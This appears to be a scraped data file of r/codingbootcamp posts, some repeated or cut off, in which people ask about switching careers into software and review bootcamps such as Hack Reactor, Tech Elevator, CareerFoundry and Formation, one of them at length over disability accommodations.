codingbootcamp,"Hi Reddit! So I did the whole shebang - got myself enrolled in a bootcamp, did the bootcamp, sent out hundred of applications and finally got that first job. What's bothering me now is....I'm absolutely terrified to start this job tomorrow.   


It's a pretty big deal first job and I'm honestly not at all sure how I managed to land it. I'll be working as a Full Stack Dev (they know very well that I only know front-end languages) with people of extremely high caliber that I'm intimidated by. Kind of irrelevant but also not: not only will I be the only woman on the team, but I'm a young, pretty, feminine woman in my 20's  (and Reddit can flame me for this but I only mention it because it's a stark contrast with the rest of the team). I have a nose ring, I wear a lot of makeup, I like to dress cute, etc. etc.

So I did the whole shebang - got myself enrolled in a bootcamp, did the bootcamp, sent out hundred of applications and finally got that first job. What's bothering me now is....I'm absolutely terrified to start this job tomorrow.   


It's a pretty big deal first job and I'm honestly not at all sure how I managed to land it. I'll be working as a Full Stack Dev (they know very well that I only know front-end languages) with people of extremely high caliber that I'm intimidated by. Kind of irrelevant but also not: not only will I be the only woman on the team, but I'm a young, pretty, feminine woman in my 20's  (and Reddit can flame me for this but I only mention it because it's a stark contrast with the rest of the team). I have a nose ring, I wear a lot of makeup, I like to dress cute, etc. etc.

codingbootcamp,"Hello,
     I would like to leverage my Systems Engineering experience to pursue Software Architecture opportunities. I have 6 years of Systems Engineering experience supporting major US Army programs, a BS in Electrical Engineering and a Masters in Systems Engineering. Within my roles I have supported programs from inception to sustainment with requirements, interoperability, design, testing, governance, modeling, ect. I think these skills would translate well into Systems Architecture. However, I have no IT experience and have not coded since undergrad. My role has always been adjacent to the coding/dev. I think I may be able to overcome the IT experience but most architect job posts require coding experience.
     Would a coding boot camp be a sufficient in place of 1/2 years of coding/software dev in my situation? I’ve considered free courses but would I really put those on my resume? Or would a boot camp with a more official certificate be more appropriate? 
     I’ve pretty recently finished my student loans so I’m not looking to tack on anymore debt. If a boot camp is appropriate are there camps less than a few grand that could provide the weight to my resume to be able to transition?

codingbootcamp,"I just want to preface by saying I am pro bootcamps. There are definitely good ones out there. The one I just picked I just despised and had to drop out. I dropped out 7 months ago and decided to become self taught and got a Software Engineer job a couple months after. I just wanted to rant, and maybe someone who was considering this bootcamp won't like the way they do it either. I'm sure some people like it, but this is why I dropped out. Maybe if someone is looking at it and reads this, and doesn't like what they see, they turn away. I completed well over half the bootcamp so I think I can speak on it.

How this bootcamp works. On each technology there are reading sections. They take about 30 mins to an hour (lets assume theyre all an hour for this post). You have a tutor that checks your work, and mentor calls for your liking on your schedule.

Let me address the elephant in the room: The amount of shit they feed you in 3-7 months (Based on how fast you finish). This is off the top of my head (There's probably more lol): HTML, CSS, Sass, Javascript, Jquery Node.js, Express, JWT Web Token/Auth, React, Redux, Unit Testing, Angular (Seriously... This framework is super intricate. Why did they throw that in with React?? Seriously, they spent a whole 5 hours on React). It took me months to learn React to be viable for a job. EVERY lesson is an hour of reading. They had 5 lessons for React. React and Angular (especially) are WAY too complex to understand anything in 5 hours without prior experience. On top of that, I can't learn well by reading mostly.  I prefer audio / visual. If you only spend 10 hours (10 reading lessons) on Javascript you're also no where close to understanding a framework like React or Javascript in general. They spent no time on Data Structures and Algorithms either.

The positives. I don't want to sound bias, there are good parts. The mentor system was great. I had 3 good mentors (had to get new ones because 2 of them quit lol. One said it was because they are underpaid) and they gave good feedback and industry advice. I basically scheduled them like once or twice a week. The projects were good to learn on if you actually could soak any information. I can understand the code now, but at the time I was lost. Aside from the overload of information, they do ""teach"" you the popular and hire-able technologies. They offer resume advice which I haven't actually done, but if it is a good system it would be definitely useful. 

Anyways thanks for reading. If you have questions let me know.",I hated my coding bootcamp (CareerFoundry),"I just want to preface by saying I am pro bootcamps.

codingbootcamp,"Hello everyone.

So, I applied for Formation a while back and got waitlisted.  Thankfully, I ended up hearing back from the same week I recently got [laid off before I even started](https://www.reddit.com/r/codingbootcamp/comments/xkghc6/got_my_first_job_two_weeks_after_bootcamp/).  Taking that as a sign, I committed and signed up, I officially started this past Monday.

Since I've only been there one week, I obviously can't speak as to the full program.  But I can say over the last week, I have met a lot of phenomenal people, among both the fellows and the mentors.

The first ""course"" I'm working on is what they call AlgoBlitz, and as it sounds, its just focused on getting really good at algorithms and data structures.  There have been a lot of things I've encountered this week, that I knew, but I didn't know I knew, if that makes any sense.  There have been a few times where if I was presented the problem on my own, I'd freeze up and have no idea how to proceed, but working on it with others has been a great help at actually applying the knowledge I already had to the specific problem.

It is pretty intense.  I had sessions every single day this week, and have had to code something every day and will definitely need to do so on weekends as well.  At my bootcamp, we only met once a week and I could get most of the work done by just kicking ass on Saturdays.  Definitely can't pull that off at Formation, or at least I certainly can't.  Maybe someone can.

Also, most of the fellows I have met actually work in the industry, which is cool.  I don't know what percentage of fellows have no real experience like me, but I do seem to be in the minority so far.  One of my co-fellows works at Obsidian, which is cool and a bit of a dream to me.  If nothing else, the chance for networking here is much better than I likely would get on my own.

So yeah, that's my thoughts after one week.  I'm really enjoying things so far.  I was a little concerned when going through reviews originally (does seriously no one have anything negative to say?! For a bit I thought they must all be paid and fake), but I think I can believe it now.

I'll post more as a I know more.","Formation.dev, Week 1 Review","Hello everyone.

codingbootcamp,"I work for a coding bootcamp called [Rithm School](https://www.rithmschool.com/courses/javascript?utm_source=reddit&amp;utm_medium=post&amp;utm_campaign=womencodingbootcamp), which specializes in super small class sizes and a really high quality, high touch educational experience. We care a lot about community and inclusivity, and we always want to make sure our students are having a positive experience.

codingbootcamp,"Every day there are posts from people looking to make a career change, which is great! Every post then has comments warning OP about the job market, trying to make it clear that getting a job after bootcamp is HARD and that the job market is saturated, job market is crazy right now, etc. 

Now, we all know that bootcamp grads coming into the job market can fill a variety of types:

* Well prepared, motivated, aggressively looking for jobs
* Good skills, but no networking ability
* Went to questionable bootcamp, comes out with questionable skills
* Some come to bootcamp with preexisting BA/BS/MA/MS degrees and have better luck than others
* Made it through bootcamp with mom and dad's money, doesn't really do anything after and these people tank published outcomes sometimes
* Has expectation that bootcamp will handhold and offer them a job, then finds out they were wrong
* Etc, Etc

Can someone who has time and experience in the field explain the actual state of the job market? Is the market really that bad? Or is it just like any other field where jobs don't grow on trees and, surprise surprise, you actually have to put in effort to get the job (but, put in the effort and work and yes, you will be rewarded with a job). I see a lot of doom and gloom over the state of things, and I am trying to figure out if what I am seeing is due to something inherent in the industry or if it's just another example of what's happening in most job markets in general right now. 

So for those with time and experience in this field, how would you accurately explain the job market for new grads? Is it actually that bad, or are people just surprised to learn that just like in any other field, you still have to work hard for a job? If it is that bad, is this like a pendulum type-thing where eventually the pendulum will swing the other way and outlooks will improve? Or has the industry changed forever and the job prospects for new graduates will likely continue to diminish?

British coding beginner and English teacher in South America wants to become a software developer!

Hey everyone!

I'm from the Uk and currently living in Perú, South America. I have a Bachelor's degree in Education and have been teaching English as a second language for the past 7 years. I'm ready for a change.

Doing a remote, part-time Bootcamp in order to launch my career as a software developer in 2023-2024 is what I'm after. I've been self-teaching coding (mainly HTML/CSS/JavaScript/ES6) via various resources (Mimo, FreeCodeCamp, W3, YouTube, etc). I am passionate and committed to beginning this journey for real. I've read your posts and spoken to a people that have recommended Hack Reactor, Launch School, and the likes. They look like just the thing I want.

However, since I'm not a US resident/citizen, I understand that it's more difficult to find payment options such as ISAs; the up-front costs are potentially out of my budget. Any recommendations?

Hey guys.

I am 34 years old male and interested in changing careers. Can anyone here give me an insight of how much you can get paid with good professional level skills gained from Coding Bootcamps? I am thinking of attending U of T SCS Coding bootcamp in Toronto. Here is my Educational and Professional History:

I already have a Bsc. from University of Toronto in Biology. The degree pretty much had no significant value unless I wanted to go for med school which I didn't. Then I stumbled upon CAD design which I loved studying and currently have a pretty decent career with 8 years of experience out of which 4 years are of project coordination. I am currently getting paid 70k plus overtime and bonuses. However, I am not too satisfied with my job and feel like there is a solid upper end salary cap in this career. On the other hand, I started online marketing as a hobby a few years ago and liked it. But I always wished I knew how to code so I could customize my pages. Then I thought of why not learn code from scratch and build it a career. I tried a few online coding classes and I didn't mind doing it all and feel like I can be pretty good at it if I learn it more professionally.

Can someone share their experience of changing careers to Tech? How do you feel about it? Is the pay rate good? What kind of companies actually hire you - start ups or the big guys? I am looking forward for your responses.",Coding Boot camp experience Toronto,"

codingbootcamp,"Currently working on the precourse work for Hack Reactor and honestly I think the way they teach the material is garbage.

codingbootcamp,"Im curious when the Hack Reactor 19 week program began? There’s blog posts about it since November 2021, so I assume the 1st class started in January/February, meaning they’d finish mid summer, so it should have been about 3 months since graduation.

For full background, I'm a single parent raising a kiddo and would prefer courses available online to do at my leisure when he is asleep hopefully, I study hard and become obsessed with new skills until I master them so I'm not scared to put the work in but want to put it into the RIGHT avenue that will give me the highest value and also in a reasonable amount of time from starting point to the time I could confidently apply to jobs. I'm open to any suggestions, and grateful for all feedback!Advice for someone looking to learn from scratch",hi coming hope advice direction completely new knowledge coding whatsoever however pick quickly enjoy obsessively learning new thing enjoy working remote space point life teach valuable relevant skill desirable hire stable fullyremote work allows higher earning potential wanted form coding coding course learn obtain certificate able start job search right company land advice certificate valuable aiming forwhere start advice legitimacy bootcampsonline training course full background single parent raising kiddo prefer course available online leisure asleep hopefully study hard become obsessed new skill master scared put work put right avenue give highest value reasonable amount time starting point time could confidently apply job open suggestion grateful feedbackadvice someone learn scratch

codingbootcamp,"I want to post here about my experience in case it's helpful to someone.

I majored in History, but I took a lot of different classes at the university I was at. I took to first two computer science courses and really liked them and did okay but I stuck to History. After I graduated I kept up an interest in programming. Self teaching is a skill I didn't really have at first but I learned after college by doing my own little projects with no intention of trying to make a career in tech. I learned HTML and CSS and I learned Python and C. I read a book about computer processors. I actually taught myself quite a lot and, more importantly I learned how to teach myself.

In 2018, six years after graduating from college, I decided that my career wasn't really going anywhere and I started at Galvanize (that was before it was bought by or bought Hack Reactor. I don't understand the business side of what happened there). It was a great program and it was very different that what Hack Reactor is so I can't speak to that.

The program was not terribly difficult for me in terms of content because I had taught myself a lot going in. I did work very hard, though, because they were teaching a lot of things I hadn't learned and because I really wanted make sure I fully understood everything I was presented with. I was one of (or maybe the most) prepared students in my program. I already knew how to program and I knew some basics about how the web worked. I met a lot of people who did not have much experience programming at Galvanize and many of them did quite well. Knowing what I knew going it was definitely helpful but not necessary.

When I finished I decided that three months was a realistic time frame for getting a job and that I could start really panicking if I didn't get a job by then. I got a job after a couple months (everyone who finished the program I was in got a job within six months I believe, most within three).

I was offered a job at a startup where I negotiated an 85K/year salary. I think I could have negotiated higher but I didn't really know what to ask for. Since then I have gotten multiple raises and promotions and am not a ""Senior Software Development Engineer.""

I think that good Coding Bootcamps can provide you with a path into the industry, but they don't really give you everything you need to know. From my experience, though, CS degrees don't either. I work with a guy who went to the same university as I did and who has been in the industry for the same length of time who is far less equipped than I am to contribute as a software engineer. It's an industry that will definitely take a chance on you if you made it through a program but it's also important that you are interested in the field and are motivated to keep teaching yourself. You can't just walk out of a Coding Bootcamp knowing everything you need to know to be a fully contributing software engineer (again, a CS degree is kind of the same) but it might give you enough to get a foot in the door if it's something you have a genuine interest in.

I thought of myself as an apprentice when I was hired and I think that's a fair way to look at it.

I still work at the company that initially hired me. They are vocal about not wanting me to leave, and have really tried to keep me. I have worked hard to be valuable, and it feels good to work for a company that recognizes that. The salary is not the most important part of the work to me, feeling like I am an important member of a team and really feeling like I'm getting better and better and being an engineer is much more gratifying. As cheesy as that is, it's one of the things I could not find outside of the tech industry.

That said, having my salary climb faster than my rent isn't anything to sneeze at either.

If anyone has questions about doing a coding boot camp I am happy to answer them with the caveat that I am me and you are you. I know that going through Galvanize was a very good decision for me but I don't know if it's a good choice for you. There were definitely people in my program who could not get through it. Of the 16 people in my cohort, five did not make it through.

3) what was your background before coding bootcamp?
4) what tech stack did you use on your bootcamp ?
5) how do I know the review seeing on a specific bootcamp is real ?

………

n)………. They are many questions like this everyday.
To be honest and transparent , I have seeing people spend thousands of dollar for a bootcamp that have fake reviews and end up didn’t have a career fulfillment.
I really want to build a platform where people could be completely  transparent , honest about their history , background before and after the coding bootcamp.
This platform will rely on others people trust.
I really want to build something truthful and honest.
Feature I will build for the mvp
1)- build a review feature where people could add review
2) build a user profile where they could share all their background and history 
3) build blogs and tutorials section where people could train before attending a coding bootcamp 
4) real time chat with other bootcampers graduated 
5) connect student with a perfect bootcamp 
6) job board to allow users and companies to apply for job and post jobs.
7 ) meetup features where bootcampers could meet either online or in person

codingbootcamp,"Hi everyone, 

I recently started coding with no prior experience and no knowledge of tech and am looking to join a bootcamp. I was learning python on codecademy and Udemy but shifted to learning JavaScript since that's what most bootcamps teach.

I really want to join CodeSmith's December cohort but I need some advice since CS is really hard to get into. I've been trying to follow the advice said on other posts about prepping but now that it's already the end of September I'm getting nervous that I won't have enough time to prepare.  
I'm currently doing CSX (or trying) and freecodecamp. I'm enrolled to start CS's JS for Beginners followed by CS Prep. I want to take Colt Steele's course on JS but I'm waiting for it to go on sale.

Is there anything else I can do to be able to learn better and faster? Not to sound arrogant but I thought I had relatively great critical thinking skills until I started learning how to code. With coding I feel like the more I learn the more I don't know and am now realizing that I'm really not the brightest crayon.. It's a little discouraging because I would get stuck on loops or array questions on CSX for hours/days and it's taking me longer than I expected to even finish the precourse on CSX.

codingbootcamp,"Throwaway.

**TL; DR** \- I applied to Tech Elevator, but wasn't accepted and was kicked out of Hack Reactor about 9 weeks into the full-time program and less than a month from the finish. My experience as an autistic person with ADHD is that they are both ableist cesspools and have very little interest in accessibility beyond DEI branding optics. They each have a very corporate, impersonal, rigid, CYA approach to handling accessibility concerns and disability accommodations which ultimately made it impossible for me to continue.

I was kicked out of Hack Reactor last week well into the second half and applied to Tech Elevator early this year. Long post below for those interested in the gritty details.

**1.** **Tech Elevator**

I filled out the online application form, which was pretty short and not to difficult to navigate. A couple of things that did give me pause right away though were that the gender options were ""man"", ""woman"", ""transgender"", and ""non-binary"" (with radio buttons), and the fact that admissions were just based on a behavioral interview and timed aptitude test. These weren't deal-breakers for me, but felt a bit sketchy, especially since they make a big point on their website to be all about helping those ""underrepresented in tech"" get a leg up and this already gave me the impression that they just cared about the look of doing so. I also eventually noticed that they have an asterisk next to their main blurb about ""underrepresented in tech"" to specifically point out ""people of color and LGBTQ+"", which was also a bit of a red flag for me, but I fit into both of those groups, so I theoretically would be allowed to apply, so I continued doing so anyway and figured there was no harm in just applying and seeing what happened. 

I got sent a link for the aptitude test and not having been informed that it would be timed, I clicked the link. I panicked a bit when I saw it was timed since I have never shined that way and had accommodations to get 50% extra time from college and high school, but decided to just do my best. It had some basic arithmetic, algebra, and logic puzzles. It was all stuff I knew how to do, but I felt like I didn't have enough time to show my true capabilities. Much to my surprise, my score was good enough despite me not even finishing half of the questions in the time allotted and I was invited to the behavioral interview and to take a longer-form aptitude test. 

Knowing what the test was at this point and having been told it would be the same format after asking, I requested 50% additional time and submitted my most recent neuropsychological evaluation report. In other situations where this had come up, I was given my extended time with zero fuss. However, the staff at Tech Elevator decided to refuse to give me this accommodation and told me that if they were to do this, then they'd have to also ""do it for everybody in order to be fair"" and that ""the system didn't allow it to be changed for just one person"". I also had let them know that in the behavioral interview, I might demonstrate some mannerisms that could throw them off and all I received as a reply was basically, ""Thanks for telling your story"". Nothing felt amiss in the actual behavioral interview itself from what I could tell and I tried to muscle through the second aptitude test. 

I also went to an info session and asked the facilitator how they approach the idea of neurodiversity. The response was, ""All software engineers are a little socially awkward, we've seen a lot of that"". No Karen, being a ""little socially awkward"" is not the same as having a developmental disability.

Not more than a week later, I got a rejection letter and was told I could reapply in six months. When I asked for some feedback, my interviewer seemed taken aback and gave me this oddly long-winded response about how they're, ""following in the footsteps of other educational institutions by not disclosing application details to the applicant"", that had all kinds of rambling assumptions about my disappointment that I never expressed to them.

**2.** **Hack Reactor**

Now I assumed this was a completely separate boot camp that was just owned by Galvanize and had to do some digging much later on to find out that it was indeed owned by the same people who own Tech Elevator, since Stride owns Galvanize. A family friend who had FAANG experience in addition to being an entrepreneur and who had a CS degree strongly recommended it and spoke very highly of colleagues he had worked with who graduated from here, so I assumed it would likely be good to go.

In the beginning, they really did seem to handle things a lot differently than Tech Elevator. They gave me extended testing time for both the aptitude test and the TAA with no protest and with swift approval. I was also excited about having the option to pick a track (Remote Full-Time) which did not require any kind of behavioral interview whatsoever, so I could just study concrete technical skills without as much possibility for abstract and fuzzy social issues that I had no control over getting in the way. When I didn't pass my TAA the first time, they gave really great feedback and set me up with two Laser Coaching sessions, which went above and beyond my expectations. I passed the TAA on my second try.

I enjoyed completing the pre-course. The staff for pre-course were very responsive and helpful in office hours and it seemed to me like they expected a lot of fundamentals and rightfully so in order for prospects to actually make it into the bootcamp, since it was all definitely necessary material in order to get anything done during the actual program.

Enter the Immersive. The first week, things didn't feel quite right, and in hindsight, I gave way too much benefit of the doubt and overanalyzed my gut feelings. After all, my family had so generously gone into about $18,000 of debt on my behalf, I was three years out of college never having never worked a full-time job before, and had already submitted job applications numbering in the 100s to no avail, along with two failed rounds of grad school applications. I was also being pressured by healthcare providers to go on SSI, spend down my savings, and live with my parents the rest of my life, which was something I absolutely did not want to entertain. I was ready for something to change.

The first red flags for me were in the Student Wiki and in the overall attitude exhibited by my cohort lead, which consisted of spouting a lot of toxically positive self-help mumbo jumbo about ""growth mindset"". The Student Wiki had rules such as writing ""warm and friendly"" emails without explaining what in the world that actually means and told us that we needed to ""exhibit appropriate eye contact at all times"". As someone who has been punished more times than I can count over not making eye contact and for seeming ""aloof and robotic"", I found this clearly suboptimal. There was also a little blurb about the opportunity to apply to be a Resident later down the line which stated that applicants must be ""a people person who takes initiative to implement palatable social programming"". I booked an office hour with the Cohort Lead to explain my concerns. I was told that what I had read wasn't what I had thought it was and that all I needed to do was have my camera on and not be doing something else 20 feet away from my device without letting them know I was leaving my desk for a little while, which was something I could easily uphold. We were also told to ""just connect"" with our cohort. When I asked for help with strategies doing that from staff, I got ignored.

I was also nervous about the emphasis on test performance and the midpoint test being something one could be thrown out over, given my lifelong issues with test performance, but was reassured that it wasn't the only factor under consideration. I also emphasized how I have almost two decades of trauma from school that I didn't want to add to, but was told to, ""stay positive and see this as a new experience"".

I briefly considered switching to the part-time program, but I was not given the information by the enrollment advisor who explained the difference between the two programs to me, that the full-time program is a huge feeder of disabled students into the part-time program, and that the leadership for that program is far more aware of the accessibility issues we face. Those were things I found out by finding alumni on my own later down the line and reaching out to them after I was hanging on by a thread.

I decided to give it a go and decline the Mulligan option, feeling unsure about it all. I felt like I needed the structure after spending months trying to self-teach, that this was one of the more rigorous bootcamp options, and that I did not want to go back for a second bachelor's.

The issues started to pile up. First, I was told that I was ""unfocused"". It was never explained to me what this meant to the staff, but it eventually ended up in my PIP later on as an ""improvement goal"". My guess is that it had to do at least partly with their other complaint that my communications were not ""concise and deliberate"". I reiterated to them that I do not make eye contact like most people and move around a lot and that this actually helps me focus. I fully disclosed my diagnoses after it seemed like they weren't getting it. They thanked me for the explanation, but ultimately didn't care (though pretended to).

Then I got told that my questions during lecture were ""irrelevant"" with no concrete feedback on how to change this other than to ""use context"" and ""think before you speak"". Eventually, I got told that I was to only put my questions in a designated Slack channel (which got ignored most of the time so I stopped and went back to asking the way I did before) and that I needed to make sure nobody else was unmuted and count to 5 before unmuting myself. Other students with ADHD asked for lectures to be recorded to which the response was, ""No. Pay attention. Recording the lecture hurts student engagement"". 

Other students privately told me that the dismissiveness of our Tech Mentor toward me on a singled out basis made them very uncomfortable and hesitant to participate in class or kickoffs. Overall, I had a much better experience with other students than the staff, especially in our Discord server, which was a bit of an open secret (They don't like it when students just start groups with other students with no staff oversight. They really didn't like that I made an extra group for neurodivergent students and told me it would violate HIPAA which is complete BS since it was completely self-selecting and required no medical documentation).

Before the PIP happened, I got put on what was called a ""growth plan"" where I had to send more screenshots of whiteboards to the Tech Mentor and have more office hours. I was doing poorly on my timed submissions of Self Assessments, which was the basis for the whole thing, even after I explained to them that tests aren't where I demonstrate my abilities the best. Before this, they gaslit me with, ""Oh, they're not graded in any way, they're only for you to help yourself"". 

The next chapter of social drama started post Technical Assessment (TA). My result was inconclusive. I technically didn't pass, but my performance was splintered, so they gave me the PIP. I busted my ass over the next few weeks working to complete the PIP requirements on top of the capstone projects we were getting into. My Tech Mentor continued to hate it when I asked for help and the Cohort Lead also reprimanded me for not asking questions that were ""beneficial enough to the group"", again with no advice on how to change this other than to ""think more"". 

One day, my Tech Mentor blew up at me for sending him a Slack message on a Saturday. We were never told this wasn't allowed and it was almost a full day of classes. He told me that I ""should have known, and need to stop doing things at the last minute"" and that he works ""normal"" hours. He then proceeded to take 5 days to actually respond to my inquiry which caused me to miss a PIP deadline. I got an extension, but only under the condition that I not ask the Tech Mentor for any assistance the day before the new due date. I ended up needing some help, but was not allowed to ask for it when I needed it. I also got told that I ""just needed to have an eye for what was being asked for"" and not misinterpret vague and contradictory directions.

During all of this, I joined the Telegraph Track, which is a big smorgasbord for all kinds of marginalized groups and asked the person running it for resources and advice related to being neurodivergent and in a bootcamp. This person was generally rather unresponsive and only sent really generic stuff like Web MD pages with symptom checklists for autism and ADHD, while also later deleting some of what I wrote in the general Slack channel for that specific workspace without explaining why. It was here that I was able to get in touch with other students and find out about their stories.

I also went back to the Accommodations Team to try and beef up my accommodations. Like before, they gave me the 50% extended testing time without any issue, but everything else was a struggle and half-assed. They demanded more documentation after I had already submitted a nearly 20-page neuropsychological report.

I found out that a Deaf student had to drop due to an interpreter and closed-captioning not being provided and so much of the curriculum being spoken. I also found out about other neurodivergent students having to switch to part-time or retake the first half (for another half tuition) en masse, as well as cohort staff providing official accommodations rather begrudgingly. 

On my final day, I was called into an office hour with my Tech Mentor and told that I ""shouldn't need someone over my shoulder this much"" and that I seem to learn better when I get more office hours and ""need to learn to apply that to the rest of the program"". I was then told that he ""had some thoughts"" and was off to speak to the Cohort and Program Leads about how to best address the situation and would get back to me by the end of that day. 

Not even 10 minutes later, I got pulled into a meeting with my Tech Mentor and Cohort Lead and told that they ""needed to initiate a separation from the program"" after several minutes of euphemistic and passive-aggressive discussion about ""how I felt about my progress"", reminders to ""see failure as an opportunity for growth"", sprinkled with blame over ""signing the PIP knowing the risks"". I had an impending sense that there was a bandaid they were stalling ripping off.

They left me with no recommendations besides really generic stuff like Udacity and immediately revoked my access to all of the portals and materials and I was told that I was being ""sent to the separations team for separation processing"". I was a few weeks shy of being assigned a Telegraph Mentor as well.

That day, I emailed the Program Lead explaining what happened to me and asked to either have a full refund, be reinstated, or moved to a part-time cohort at no additional cost, as well as asking who to talk to if it were someone higher up. This message was completely ignored. I also filled out a formal complaint form. The last I've heard is that it ""will be investigated in the next 14 business days"". This same person I sent the complaint form to quickly sent a 1/3 refund back where it came from with a receipt. My psychologist wanted to add his two cents to the complaint evidence submitted but was told that it was not allowed for him to talk to anybody there about me.

The family friend who initially recommended the program glowingly is getting in touch with his own connections to let them know how it went for me and saying he will never recommend this program ever again to anybody.

**The End**

There it is folks. I wanted to put this out there because when I was looking at reviews on different bootcamps, I couldn't find any regarding students coming in with a situation like mine and think it will help others make an informed decision. I also think it is good for people to know where these places stand in 2022 after being acquired since some have alluded to things ""not being the same"" after that happened.",A Review of Two Stride-Owned Bootcamps (Hack Reactor + Tech Elevator) in 2022,"Throwaway.

My experience as an autistic person with ADHD is that they are both ableist cesspools and have very little interest in accessibility beyond DEI branding optics. They each have a very corporate, impersonal, rigid, CYA approach to handling accessibility concerns and disability accommodations which ultimately made it impossible for me to continue.

I was kicked out of Hack Reactor last week well into the second half and applied to Tech Elevator early this year. Long post below for those interested in the gritty details.

**1.** **Tech Elevator**

I filled out the online application form, which was pretty short and not to difficult to navigate. A couple of things that did give me pause right away though were that the gender options were ""man"", ""woman"", ""transgender"", and ""non-binary"" (with radio buttons), and the fact that admissions were just based on a behavioral interview and timed aptitude test. These weren't deal-breakers for me, but felt a bit sketchy, especially since they make a big point on their website to be all about helping those ""underrepresented in tech"" get a leg up and this already gave me the impression that they just cared about the look of doing so. I also eventually noticed that they have an asterisk next to their main blurb about ""underrepresented in tech"" to specifically point out ""people of color and LGBTQ+"", which was also a bit of a red flag for me, but I fit into both of those groups, so I theoretically would be allowed to apply, so I continued doing so anyway and figured there was no harm in just applying and seeing what happened. 

I got sent a link for the aptitude test and not having been informed that it would be timed, I clicked the link. I panicked a bit when I saw it was timed since I have never shined that way and had accommodations to get 50% extra time from college and high school, but decided to just do my best. It had some basic arithmetic, algebra, and logic puzzles. It was all stuff I knew how to do, but I felt like I didn't have enough time to show my true capabilities. Much to my surprise, my score was good enough despite me not even finishing half of the questions in the time allotted and I was invited to the behavioral interview and to take a longer-form aptitude test. 

Knowing what the test was at this point and having been told it would be the same format after asking, I requested 50% additional time and submitted my most recent neuropsychological evaluation report. In other situations where this had come up, I was given my extended time with zero fuss. However, the staff at Tech Elevator decided to refuse to give me this accommodation and told me that if they were to do this, then they'd have to also ""do it for everybody in order to be fair"" and that ""the system didn't allow it to be changed for just one person"". I also had let them know that in the behavioral interview, I might demonstrate some mannerisms that could throw them off and all I received as a reply was basically, ""Thanks for telling your story"". Nothing felt amiss in the actual behavioral interview itself from what I could tell and I tried to muscle through the second aptitude test. 

I also went to an info session and asked the facilitator how they approach the idea of neurodiversity. The response was, ""All software engineers are a little socially awkward, we've seen a lot of that"". No Karen, being a ""little socially awkward"" is not the same as having a developmental disability.

Not more than a week later, I got a rejection letter and was told I could reapply in six months. When I asked for some feedback, my interviewer seemed taken aback and gave me this oddly long-winded response about how they're, ""following in the footsteps of other educational institutions by not disclosing application details to the applicant"", that had all kinds of rambling assumptions about my disappointment that I never expressed to them.

**2.** **Hack Reactor**

Now I assumed this was a completely separate boot camp that was just owned by Galvanize and had to do some digging much later on to find out that it was indeed owned by the same people who own Tech Elevator, since Stride owns Galvanize. A family friend who had FAANG experience in addition to being an entrepreneur and who had a CS degree strongly recommended it and spoke very highly of colleagues he had worked with who graduated from here, so I assumed it would likely be good to go.

In the beginning, they really did seem to handle things a lot differently than Tech Elevator. They gave me extended testing time for both the aptitude test and the TAA with no protest and with swift approval. I was also excited about having the option to pick a track (Remote Full-Time) which did not require any kind of behavioral interview whatsoever, so I could just study concrete technical skills without as much possibility for abstract and fuzzy social issues that I had no control over getting in the way. When I didn't pass my TAA the first time, they gave really great feedback and set me up with two Laser Coaching sessions, which went above and beyond my expectations. I passed the TAA on my second try.

I enjoyed completing the pre-course. The staff for pre-course were very responsive and helpful in office hours and it seemed to me like they expected a lot of fundamentals and rightfully so in order for prospects to actually make it into the bootcamp, since it was all definitely necessary material in order to get anything done during the actual program.

Enter the Immersive. The first week, things didn't feel quite right, and in hindsight, I gave way too much benefit of the doubt and overanalyzed my gut feelings. After all, my family had so generously gone into about $18,000 of debt on my behalf, I was three years out of college never having never worked a full-time job before, and had already submitted job applications numbering in the 100s to no avail, along with two failed rounds of grad school applications. I was also being pressured by healthcare providers to go on SSI, spend down my savings, and live with my parents the rest of my life, which was something I absolutely did not want to entertain. I was ready for something to change.

The first red flags for me were in the Student Wiki and in the overall attitude exhibited by my cohort lead, which consisted of spouting a lot of toxically positive self-help mumbo jumbo about ""growth mindset"". The Student Wiki had rules such as writing ""warm and friendly"" emails without explaining what in the world that actually means and told us that we needed to ""exhibit appropriate eye contact at all times"". As someone who has been punished more times than I can count over not making eye contact and for seeming ""aloof and robotic"", I found this clearly suboptimal. There was also a little blurb about the opportunity to apply to be a Resident later down the line which stated that applicants must be ""a people person who takes initiative to implement palatable social programming"". I booked an office hour with the Cohort Lead to explain my concerns. I was told that what I had read wasn't what I had thought it was and that all I needed to do was have my camera on and not be doing something else 20 feet away from my device without letting them know I was leaving my desk for a little while, which was something I could easily uphold. We were also told to ""just connect"" with our cohort. When I asked for help with strategies doing that from staff, I got ignored.

I was also nervous about the emphasis on test performance and the midpoint test being something one could be thrown out over, given my lifelong issues with test performance, but was reassured that it wasn't the only factor under consideration. I also emphasized how I have almost two decades of trauma from school that I didn't want to add to, but was told to, ""stay positive and see this as a new experience"".

I briefly considered switching to the part-time program, but I was not given the information by the enrollment advisor who explained the difference between the two programs to me, that the full-time program is a huge feeder of disabled students into the part-time program, and that the leadership for that program is far more aware of the accessibility issues we face. Those were things I found out by finding alumni on my own later down the line and reaching out to them after I was hanging on by a thread.

I decided to give it a go and decline the Mulligan option, feeling unsure about it all. I felt like I needed the structure after spending months trying to self-teach, that this was one of the more rigorous bootcamp options, and that I did not want to go back for a second bachelor's.

The issues started to pile up. First, I was told that I was ""unfocused"". It was never explained to me what this meant to the staff, but it eventually ended up in my PIP later on as an ""improvement goal"". My guess is that it had to do at least partly with their other complaint that my communications were not ""concise and deliberate"". I reiterated to them that I do not make eye contact like most people and move around a lot and that this actually helps me focus. I fully disclosed my diagnoses after it seemed like they weren't getting it. They thanked me for the explanation, but ultimately didn't care (though pretended to).

Then I got told that my questions during lecture were ""irrelevant"" with no concrete feedback on how to change this other than to ""use context"" and ""think before you speak"". Eventually, I got told that I was to only put my questions in a designated Slack channel (which got ignored most of the time so I stopped and went back to asking the way I did before) and that I needed to make sure nobody else was unmuted and count to 5 before unmuting myself. Other students with ADHD asked for lectures to be recorded to which the response was, ""No. Pay attention. Recording the lecture hurts student engagement"". 

Other students privately told me that the dismissiveness of our Tech Mentor toward me on a singled out basis made them very uncomfortable and hesitant to participate in class or kickoffs. Overall, I had a much better experience with other students than the staff, especially in our Discord server, which was a bit of an open secret (They don't like it when students just start groups with other students with no staff oversight. They really didn't like that I made an extra group for neurodivergent students and told me it would violate HIPAA which is complete BS since it was completely self-selecting and required no medical documentation).

Before the PIP happened, I got put on what was called a ""growth plan"" where I had to send more screenshots of whiteboards to the Tech Mentor and have more office hours. I was doing poorly on my timed submissions of Self Assessments, which was the basis for the whole thing, even after I explained to them that tests aren't where I demonstrate my abilities the best. Before this, they gaslit me with, ""Oh, they're not graded in any way, they're only for you to help yourself"". 

